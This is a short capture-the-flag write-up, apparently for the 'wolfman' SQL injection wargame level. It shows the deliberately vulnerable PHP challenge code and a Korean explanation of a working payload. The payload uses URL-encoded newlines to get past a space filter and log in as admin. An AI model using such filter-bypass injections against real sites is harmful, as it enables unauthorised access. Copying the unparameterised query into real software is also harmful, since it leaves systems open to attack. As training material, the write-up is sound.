# WOLFMEN

## code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 보면 id=guest로 고정이되어 있고 pw는 get으로 받고 있다. 그리고  pw에서 스페이스바가 막혀있으므로 url 뒤에 
```
?pw='%0aor%0a1=1%0aand%0aid='admin'%23
```
이렇게 입력을 하게 되면 id는 and를 함으로서 admin을 넣고 그 참인 값과 pw를 or해서 참을 만들었다. 그리하여서 pw값은 참이 되고 id는 admin이 들어가서 문제가 풀리게된다. (스페이스바가 막혔기 때문에 %0a를 사용하는데 %0a는 개행이다.)

------------